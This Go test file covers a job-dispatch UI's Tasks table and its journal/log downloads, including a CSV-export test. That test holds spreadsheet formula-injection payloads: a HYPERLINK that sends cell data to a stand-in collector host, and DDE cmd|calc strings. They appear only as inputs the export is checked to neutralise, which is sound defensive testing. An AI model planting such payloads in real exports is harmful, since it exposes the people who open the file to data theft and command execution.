// This file covers the Tasks section's projection: what each column says,
// and the two things the section has to be honest about.
//
// The projection is tested directly rather than through the router because
// the conformance harness wires no journal at all, and the section that
// matters here is the one that does not exist without one. What the harness
// DOES prove is the other half, that a deployment with no journal reader
// draws no Tasks tab.
package jobs

import (
	"bytes"
	"context"
	"encoding/csv"
	"errors"
	"io"
	"strings"
	"testing"
	"time"

	"github.com/Subject-Void-LLC/the-pleiades/internal/dispatch"
	"github.com/Subject-Void-LLC/the-pleiades/internal/engine"
	"github.com/Subject-Void-LLC/the-pleiades/internal/ui/view"
)

// stubJournal is a JournalReader over a fixed answer.
type stubJournal struct {
	entries   []engine.JournalEntry
	truncated bool
	err       error
}

func (s stubJournal) ForJob(context.Context, string, int) ([]engine.JournalEntry, bool, error) {
	return s.entries, s.truncated, s.err
}

// entry builds a journal entry with the fields this projection reads.
func entry(device, node string, seq int, outcome engine.Outcome) engine.JournalEntry {
	return engine.JournalEntry{
		JobID: "job-1", DeviceID: device, NodeID: node, Sequence: seq,
		FQCN: "svc.systemd.restart", TaskName: "restart the thing",
		Outcome:    outcome,
		StartedAt:  time.Date(2026, 9, 12, 10, 0, 0, 0, time.UTC),
		FinishedAt: time.Date(2026, 9, 12, 10, 0, 2, 500*int(time.Millisecond), time.UTC),
	}
}

func TestTasksSection_ProjectsAnEntryOntoItsColumns(t *testing.T) {
	section := tasksSection(stubJournal{entries: []engine.JournalEntry{
		entry("dev-1", "tasks[0]", 1, engine.OutcomeChanged),
	}}, nil)

	rows, err := section.Rows(context.Background(), "job-1")
	if err != nil {
		t.Fatalf("Rows: %v", err)
	}
	if len(rows) != 1 {
		t.Fatalf("Rows returned %d rows, want 1", len(rows))
	}

	want := view.Cells{
		"step": "1", "device": "dev-1", "task": "restart the thing",
		"action": "svc.systemd.restart", "outcome": "changed", "took": "2.5s", "detail": "",
	}
	for name, expected := range want {
		if got := rows[0].Cells[name]; got != expected {
			t.Errorf("cell %q = %q, want %q", name, got, expected)
		}
	}
	// The device links by id even though the cell shows a name, which is
	// what makes the column walkable rather than something to copy out.
	if rows[0].Refs["device"] != "dev-1" {
		t.Errorf("the device ref is %q, want the device id", rows[0].Refs["device"])
	}
}

// TestTasksSection_NamesTheDeviceRatherThanItsID is the join this section
// takes a second port to do.
//
// A journal entry records a device id and nothing else about the device, so
// without the job's own task rows the DEVICE column renders an opaque
// identifier -- which is the "a list that prints ORGANIZATION: 1 has moved
// the join into the reader's head" failure this UI has a rule about.
func TestTasksSection_NamesTheDeviceRatherThanItsID(t *testing.T) {
	jobs := &stubJobStore{tasks: []dispatch.JobTask{
		{DeviceID: "dev-1", DeviceName: "edge-mad-07"},
	}}
	section := tasksSection(stubJournal{entries: []engine.JournalEntry{
		entry("dev-1", "tasks[0]", 1, engine.OutcomeChanged),
		// A device the job has no task row for, which a redelivered
		// dispatch can produce. It falls back to the id rather than
		// rendering an empty cell.
		entry("dev-ghost", "tasks[0]", 1, engine.OutcomeFailed),
	}}, jobs)

	rows, err := section.Rows(context.Background(), "job-1")
	if err != nil {
		t.Fatalf("Rows: %v", err)
	}
	if rows[0].Cells["device"] != "edge-mad-07" {
		t.Errorf("the device cell is %q, want the name the job dispatched under", rows[0].Cells["device"])
	}
	if rows[1].Cells["device"] != "dev-ghost" {
		t.Errorf("an unknown device rendered %q, want its id rather than a blank cell", rows[1].Cells["device"])
	}
}

// TestTasksSection_SaysWhenItIsShowingLessThanTheWholeRun is the honesty
// property the Note hook was added for.
//
// A table capped at the limit shows a partial record of what happened while
// looking exactly like a complete one, and on an audit trail that is the
// worst available outcome.
func TestTasksSection_SaysWhenItIsShowingLessThanTheWholeRun(t *testing.T) {
	entries := []engine.JournalEntry{entry("dev-1", "tasks[0]", 1, engine.OutcomeRan)}

	full := tasksSection(stubJournal{entries: entries}, nil)
	if note := full.Note(context.Background(), "job-1"); note != "" {
		t.Errorf("a complete run carries the note %q, want none", note)
	}

	capped := tasksSection(stubJournal{entries: entries, truncated: true}, nil)
	note := capped.Note(context.Background(), "job-1")
	if note == "" {
		t.Fatal("a truncated read carries no note, so the page shows a partial run as if it were whole")
	}
	if !strings.Contains(note, "not the whole record") {
		t.Errorf("the note does not say the record is partial: %q", note)
	}
}

// TestTasksSection_AReadFailureIsAnErrorAndNotAnEmptyTable matters because
// the two render identically and mean opposite things: "this job ran
// nothing" and "the journal could not be read".
func TestTasksSection_AReadFailureIsAnErrorAndNotAnEmptyTable(t *testing.T) {
	boom := errors.New("the database is unreachable")
	section := tasksSection(stubJournal{err: boom}, nil)

	if _, err := section.Rows(context.Background(), "job-1"); !errors.Is(err, boom) {
		t.Fatalf("Rows on a failed read returned %v, want the read error", err)
	}
	// And the note stays silent rather than adding a second voice for one
	// failure the section already reports.
	if note := section.Note(context.Background(), "job-1"); note != "" {
		t.Errorf("a failed read also produced the note %q", note)
	}
}

// TestTasksSection_IsAbsentWithoutAJournalReader is the difference between
// an absent tab and an empty one.
//
// Having no journal is a property of the INSTALLATION, so drawing the tab
// would promise something that deployment cannot do for any job. A playbook
// job's blank table is a property of the RECORD, and that one belongs on
// the page, which is what Empty says.
func TestTasksSection_IsAbsentWithoutAJournalReader(t *testing.T) {
	without := sections(nil, nil)
	for _, s := range without {
		if s.Title == tasksTitle {
			t.Fatal("a deployment with no journal reader still draws a Tasks tab")
		}
	}

	with := sections(nil, stubJournal{})
	var found bool
	for _, s := range with {
		if s.Title == tasksTitle {
			found = true
		}
	}
	if !found {
		t.Fatal("a deployment with a journal reader draws no Tasks tab, so the check above proves nothing")
	}
}

// TestTasksSection_EmptyStateExplainsAPlaybookJob pins the sentence, not
// its wording, but the fact it has to carry.
//
// Only the native adapter writes the journal, so a playbook job's table is
// permanently empty. An empty state reading "no tasks" would say the job
// did nothing, which is false and is exactly the ambiguity Section.Empty
// exists to remove.
func TestTasksSection_EmptyStateExplainsAPlaybookJob(t *testing.T) {
	section := tasksSection(stubJournal{}, nil)
	if !strings.Contains(section.Empty, "playbook") {
		t.Errorf("the empty state does not mention a playbook job, so its permanently blank table reads as a job that did nothing: %q", section.Empty)
	}
	if !strings.Contains(section.Empty, "Live output") {
		t.Errorf("the empty state does not send the reader to where a playbook's per-task detail actually is: %q", section.Empty)
	}
}

func TestTasksSection_DetailAndDuration(t *testing.T) {
	cases := []struct {
		name         string
		mutate       func(*engine.JournalEntry)
		wantDetail   string
		wantDuration string
	}{
		{
			name:         "a failure names the stage it reached",
			mutate:       func(e *engine.JournalEntry) { e.FailureStage = engine.FailureStage("connect") },
			wantDetail:   "failed at connect",
			wantDuration: "2.5s",
		},
		{
			name: "a skip in a loop says which of how many",
			mutate: func(e *engine.JournalEntry) {
				e.SkipKind, e.SkipOrdinal, e.SkipTotal = engine.SkipKind("when"), 2, 5
			},
			wantDetail:   "skipped by when (2 of 5)",
			wantDuration: "2.5s",
		},
		{
			name:         "a skip outside a loop omits the count",
			mutate:       func(e *engine.JournalEntry) { e.SkipKind = engine.SkipKind("when") },
			wantDetail:   "skipped by when",
			wantDuration: "2.5s",
		},
		{
			// A node that never started and one that took no measurable
			// time are different facts, and "0s" is the wrong way to say
			// the first.
			name:         "a node that never started shows no duration",
			mutate:       func(e *engine.JournalEntry) { e.StartedAt, e.FinishedAt = time.Time{}, time.Time{} },
			wantDetail:   "",
			wantDuration: "",
		},
		{
			name: "clock skew is not this column's to adjudicate",
			mutate: func(e *engine.JournalEntry) {
				e.FinishedAt = e.StartedAt.Add(-time.Second)
			},
			wantDetail:   "",
			wantDuration: "",
		},
		{
			name: "a sub-second node reads in milliseconds",
			mutate: func(e *engine.JournalEntry) {
				e.FinishedAt = e.StartedAt.Add(120 * time.Millisecond)
			},
			wantDetail:   "",
			wantDuration: "120ms",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			e := entry("dev-1", "tasks[0]", 1, engine.OutcomeFailed)
			tc.mutate(&e)
			section := tasksSection(stubJournal{entries: []engine.JournalEntry{e}}, nil)

			rows, err := section.Rows(context.Background(), "job-1")
			if err != nil {
				t.Fatalf("Rows: %v", err)
			}
			if got := rows[0].Cells["detail"]; got != tc.wantDetail {
				t.Errorf("detail = %q, want %q", got, tc.wantDetail)
			}
			if got := rows[0].Cells["took"]; got != tc.wantDuration {
				t.Errorf("took = %q, want %q", got, tc.wantDuration)
			}
		})
	}
}

// TestTasksSection_LabelsFallBackHonestly covers the two columns that have
// something worse than a blank cell to fall back to.
func TestTasksSection_LabelsFallBackHonestly(t *testing.T) {
	e := entry("dev-1", "tasks[3]", 1, engine.OutcomeRan)
	e.TaskName = ""
	e.FQCNUnresolved = true

	section := tasksSection(stubJournal{entries: []engine.JournalEntry{e}}, nil)
	rows, err := section.Rows(context.Background(), "job-1")
	if err != nil {
		t.Fatalf("Rows: %v", err)
	}

	// An unnamed task falls back to its position in the document, which is
	// a worse answer than a name and a much better one than nothing on the
	// column a reader scans first.
	if rows[0].Cells["task"] != "tasks[3]" {
		t.Errorf("an unnamed task rendered %q, want its node id", rows[0].Cells["task"])
	}
	// An unresolved FQCN is marked, because "ran svc.systemd.restart" and
	// "named something this deployment does not have" look identical in a
	// bare column.
	if !strings.Contains(rows[0].Cells["action"], "unresolved") {
		t.Errorf("an unresolved action rendered %q, want it marked", rows[0].Cells["action"])
	}
}

// TestTasksSection_TheCollectionPageShowsNothing guards the parentless
// case: a journal belongs to a job, so the section on the list page must
// not read every entry in the system.
func TestTasksSection_TheCollectionPageShowsNothing(t *testing.T) {
	section := tasksSection(stubJournal{entries: []engine.JournalEntry{
		entry("dev-1", "tasks[0]", 1, engine.OutcomeRan),
	}}, nil)

	rows, err := section.Rows(context.Background(), "")
	if err != nil {
		t.Fatalf("Rows: %v", err)
	}
	if len(rows) != 0 {
		t.Errorf("the collection page rendered %d journal rows", len(rows))
	}
	if note := section.Note(context.Background(), ""); note != "" {
		t.Errorf("the collection page carries the note %q", note)
	}
}

// stubJobStore answers only Get, which is all deviceNames uses.
type stubJobStore struct {
	dispatch.JobStore
	job   *dispatch.Job
	tasks []dispatch.JobTask
	err   error
}

func (s *stubJobStore) Get(context.Context, string) (*dispatch.Job, []dispatch.JobTask, error) {
	if s.err != nil {
		return nil, nil, s.err
	}
	job := s.job
	if job == nil {
		job = &dispatch.Job{}
	}
	return job, s.tasks, nil
}

// TestTasksSection_AFailedNameLookupStillRendersTheTable proves the join is
// best effort.
//
// A job whose task rows cannot be read still has a journal worth showing.
// Failing the whole page for the sake of one column would trade everything
// the reader came for against a nicety.
func TestTasksSection_AFailedNameLookupStillRendersTheTable(t *testing.T) {
	jobs := &stubJobStore{err: errors.New("task rows unavailable")}
	section := tasksSection(stubJournal{entries: []engine.JournalEntry{
		entry("dev-1", "tasks[0]", 1, engine.OutcomeRan),
	}}, jobs)

	rows, err := section.Rows(context.Background(), "job-1")
	if err != nil {
		t.Fatalf("Rows failed because the name lookup did: %v", err)
	}
	if len(rows) != 1 || rows[0].Cells["device"] != "dev-1" {
		t.Errorf("rows = %+v, want one row falling back to the device id", rows)
	}
}

// stubLogs is a LogArchive over a fixed answer.
type stubLogs struct {
	retained bool
	body     string
	err      error
}

func (s stubLogs) Retained(context.Context, string) bool { return s.retained }

func (s stubLogs) WriteTo(_ context.Context, w io.Writer, _ string) error {
	if s.err != nil {
		return s.err
	}
	_, err := io.WriteString(w, s.body)
	return err
}

// TestDownloads_OfferOnlyWhatTheJobActuallyHas is the chooser's whole
// point.
//
// The two records are complementary: a runbook job has a journal and two
// lines of output, a playbook job has rich output and no journal at all,
// and an old job has neither because the broker's window has passed. A
// fixed pair of links hands an operator an empty file about half the time.
func TestDownloads_OfferOnlyWhatTheJobActuallyHas(t *testing.T) {
	entry1 := []engine.JournalEntry{entry("dev-1", "tasks[0]", 1, engine.OutcomeRan)}
	done := &stubJobStore{job: &dispatch.Job{State: "completed"}}

	cases := []struct {
		name    string
		entries JournalReader
		logs    LogArchive
		jobs    jobReader
		want    []string
	}{
		{
			name:    "a runbook job, whose journal is the record worth having",
			entries: stubJournal{entries: entry1},
			logs:    stubLogs{retained: false},
			jobs:    done,
			want:    []string{downloadJournal},
		},
		{
			name:    "a playbook job, which has no journal and real output",
			entries: stubJournal{},
			logs:    stubLogs{retained: true},
			jobs:    done,
			want:    []string{downloadOutput},
		},
		{
			name:    "a job whose log window has passed and whose journal remains",
			entries: stubJournal{entries: entry1},
			logs:    stubLogs{retained: false},
			jobs:    done,
			want:    []string{downloadJournal},
		},
		{
			name:    "an old playbook job, which has nothing left to give",
			entries: stubJournal{},
			logs:    stubLogs{retained: false},
			jobs:    done,
			want:    nil,
		},
		{
			name:    "a job with both",
			entries: stubJournal{entries: entry1},
			logs:    stubLogs{retained: true},
			jobs:    done,
			want:    []string{downloadJournal, downloadOutput},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var offered []string
			for _, dl := range downloads(tc.entries, tc.logs, tc.jobs) {
				if dl.Offers(context.Background(), "job-1") {
					offered = append(offered, dl.Name)
				}
			}
			if strings.Join(offered, ",") != strings.Join(tc.want, ",") {
				t.Errorf("offered %v, want %v", offered, tc.want)
			}
		})
	}
}

// TestDownloads_OutputIsWithheldWhileAJobIsStillRunning is the condition
// that is not a nicety.
//
// The log subject has no end-of-stream marker, so a drain of a running job
// stops at whatever had arrived when the request reached the broker. A file
// that silently ends mid-run is indistinguishable from a run that ended
// there, and somebody reading it concludes the job finished cleanly.
func TestDownloads_OutputIsWithheldWhileAJobIsStillRunning(t *testing.T) {
	logs := stubLogs{retained: true}
	entries := stubJournal{}

	for _, state := range []string{"pending", "fanning_out", "running"} {
		t.Run(state, func(t *testing.T) {
			jobs := &stubJobStore{job: &dispatch.Job{State: state}}
			for _, dl := range downloads(entries, logs, jobs) {
				if dl.Name == downloadOutput && dl.Offers(context.Background(), "job-1") {
					t.Errorf("a %s job offers a log download, which would save a run that is still going as though it had ended", state)
				}
			}
		})
	}

	// ...and is offered once the job has stopped, which is what proves the
	// checks above are not passing because the control never appears.
	for _, state := range []string{"completed", "failed", "canceled"} {
		t.Run(state, func(t *testing.T) {
			jobs := &stubJobStore{job: &dispatch.Job{State: state}}
			var found bool
			for _, dl := range downloads(entries, logs, jobs) {
				if dl.Name == downloadOutput && dl.Offers(context.Background(), "job-1") {
					found = true
				}
			}
			if !found {
				t.Errorf("a %s job offers no log download", state)
			}
		})
	}
}

// TestDownloads_AJobThatCannotBeReadOffersNoOutput covers the fail-closed
// direction: the failure an operator can act on is a missing link, never a
// file that turns out to be truncated after they have forwarded it.
func TestDownloads_AJobThatCannotBeReadOffersNoOutput(t *testing.T) {
	jobs := &stubJobStore{err: errors.New("unreadable")}
	for _, dl := range downloads(stubJournal{}, stubLogs{retained: true}, jobs) {
		if dl.Name == downloadOutput && dl.Offers(context.Background(), "job-1") {
			t.Error("a job whose state cannot be read still offers a log download")
		}
	}
}

// TestDownloads_JournalCSVIsTheWholeRecord pins the file's shape against
// what the test itself wrote, header included.
func TestDownloads_JournalCSVIsTheWholeRecord(t *testing.T) {
	e := entry("dev-1", "tasks[0]", 1, engine.OutcomeChanged)
	e.Attempt = 2
	e.StatKeys = []string{"rc", "stdout"}
	e.FailureStage = engine.FailureStage("execute")

	var buf bytes.Buffer
	if err := writeJournalCSV(&buf, []engine.JournalEntry{e}, false); err != nil {
		t.Fatalf("writeJournalCSV: %v", err)
	}

	records, err := csv.NewReader(&buf).ReadAll()
	if err != nil {
		t.Fatalf("the file is not valid CSV: %v", err)
	}
	if len(records) != 2 {
		t.Fatalf("the file has %d rows, want a header and one entry", len(records))
	}
	if strings.Join(records[0], ",") != strings.Join(journalColumns, ",") {
		t.Errorf("the header is %v, want the declared columns", records[0])
	}

	// Positional, read through the header rather than by index, so a
	// column inserted in the middle does not silently shift every
	// assertion onto its neighbour.
	got := map[string]string{}
	for i, name := range records[0] {
		got[name] = records[1][i]
	}
	want := map[string]string{
		"device": "dev-1", "attempt": "2", "sequence": "1", "node": "tasks[0]",
		"task": "restart the thing", "action": "svc.systemd.restart",
		"outcome": "changed", "failure_stage": "execute",
		"duration_ms": "2500", "stat_keys": "rc stdout",
	}
	for name, expected := range want {
		if got[name] != expected {
			t.Errorf("column %q = %q, want %q", name, got[name], expected)
		}
	}
	// The stamps are what an audit needs; the duration beside them is what
	// a person sorts by. Both, because asking a spreadsheet to subtract
	// two timestamps is asking for that column to be wrong.
	if got["started_at"] == "" || got["finished_at"] == "" {
		t.Errorf("the timestamps are empty: started=%q finished=%q", got["started_at"], got["finished_at"])
	}
}

// TestDownloads_JournalCSVCarriesKeysAndNeverValues is the property that
// makes this file safe to hand somebody.
//
// The journal records stat and param KEYS and holds no field whose type
// could contain a value, which two archtests enforce. This asserts the
// download did not undo that by reaching for something else.
func TestDownloads_JournalCSVCarriesKeysAndNeverValues(t *testing.T) {
	for _, column := range journalColumns {
		if strings.Contains(column, "value") || column == "stats" || column == "params" {
			t.Errorf("the CSV declares a column %q, which suggests it carries values rather than keys", column)
		}
	}
	if !strings.Contains(strings.Join(journalColumns, ","), "stat_keys") {
		t.Error("the CSV does not carry the stat keys, which are the only part of a stat it may")
	}
}

// TestDownloads_JournalCSVSaysWhenItIsPartial is the disclosure the store's
// truncated flag exists for, and which this download discarded into `_`
// until a review caught it.
//
// A 200-device run of a 15-node runbook is 3000 rows against a 2000-row
// read. The operator got a file labelled "one row per task per device" that
// silently held two thirds of one, with nothing in it saying so -- while
// the Tasks tab on the page they clicked it from said so plainly.
func TestDownloads_JournalCSVSaysWhenItIsPartial(t *testing.T) {
	e := entry("dev-1", "tasks[0]", 1, engine.OutcomeRan)

	var full bytes.Buffer
	if err := writeJournalCSV(&full, []engine.JournalEntry{e}, false); err != nil {
		t.Fatalf("writeJournalCSV: %v", err)
	}
	if strings.Contains(full.String(), "truncated") {
		t.Error("a complete journal claims to be partial")
	}

	var partial bytes.Buffer
	if err := writeJournalCSV(&partial, []engine.JournalEntry{e}, true); err != nil {
		t.Fatalf("writeJournalCSV: %v", err)
	}

	// Still valid CSV, which is the whole reason the marker is a full
	// record rather than a trailing line: encoding/csv pins the field
	// count from the header and answers a short row with ErrFieldCount, so
	// an honest disclosure written carelessly makes the file unreadable.
	records, err := csv.NewReader(&partial).ReadAll()
	if err != nil {
		t.Fatalf("the truncated file is not valid CSV, so the disclosure broke the artefact: %v", err)
	}
	last := records[len(records)-1]
	if len(last) != len(journalColumns) {
		t.Errorf("the marker row has %d fields, want %d", len(last), len(journalColumns))
	}
	if last[0] != "pleiades:truncated" {
		t.Errorf("the last row is %v, want a truncation marker", last)
	}
	if !strings.Contains(last[1], "stops at") {
		t.Errorf("the marker does not say where the file stops: %q", last[1])
	}
}

// TestDownloads_JournalCSVDoesNotHandOverALiveFormula is the other half of
// "safe to hand somebody", and the half the key/value property does not
// cover.
//
// A runbook author writes a task's name as free text and nothing validates
// it. A name beginning with =, +, - or @ is a formula to Excel, Sheets and
// LibreOffice rather than a label, so the export this file advertises as
// forwardable would carry a one-click exfiltration of the row beside it to
// whoever opened it -- a different person from the author, on an RBAC
// platform, with a different threat model.
//
// Each case asserts the emitted BYTES rather than the column list, which is
// what the sibling secret-values test cannot do: it reads journalColumns
// and can only fail on a rename.
func TestDownloads_JournalCSVDoesNotHandOverALiveFormula(t *testing.T) {
	triggers := []string{
		`=HYPERLINK("http://collector.example/?d="&A1,"Open report")`,
		`+cmd|'/c calc'!A1`,
		`-2+3+cmd|' /C calc'!A0`,
		`@SUM(1+1)*cmd|' /C calc'!A0`,
	}

	for _, name := range triggers {
		t.Run(name[:8], func(t *testing.T) {
			e := entry("dev-1", "tasks[0]", 1, engine.OutcomeChanged)
			e.TaskName = name

			var buf bytes.Buffer
			if err := writeJournalCSV(&buf, []engine.JournalEntry{e}, false); err != nil {
				t.Fatalf("writeJournalCSV: %v", err)
			}
			records, err := csv.NewReader(&buf).ReadAll()
			if err != nil {
				t.Fatalf("the file is not valid CSV: %v", err)
			}

			var task string
			for i, col := range records[0] {
				if col == "task" {
					task = records[1][i]
				}
			}
			if task == name {
				t.Fatalf("the task cell is emitted verbatim as %q, so a spreadsheet evaluates it", task)
			}
			if !strings.HasPrefix(task, "'") {
				t.Errorf("the task cell is %q, want the leading apostrophe that makes it text", task)
			}
			// Neutralised, not censored. An operator reading the file has
			// to be able to see what the task was actually called.
			if !strings.Contains(task, name) {
				t.Errorf("the task cell is %q, which no longer carries the name %q", task, name)
			}
		})
	}
}

// TestDownloads_JournalCSVLeavesAnOrdinaryNameAlone is the negative control
// for the case above: the guard fires on the four trigger characters and on
// nothing else, so the common file is unchanged.
func TestDownloads_JournalCSVLeavesAnOrdinaryNameAlone(t *testing.T) {
	e := entry("dev-1", "tasks[0]", 1, engine.OutcomeChanged)
	e.TaskName = "restart the thing"

	var buf bytes.Buffer
	if err := writeJournalCSV(&buf, []engine.JournalEntry{e}, false); err != nil {
		t.Fatalf("writeJournalCSV: %v", err)
	}
	records, err := csv.NewReader(&buf).ReadAll()
	if err != nil {
		t.Fatalf("the file is not valid CSV: %v", err)
	}
	for i, col := range records[0] {
		if col == "task" && records[1][i] != "restart the thing" {
			t.Errorf("an ordinary task name was rewritten to %q", records[1][i])
		}
	}
}
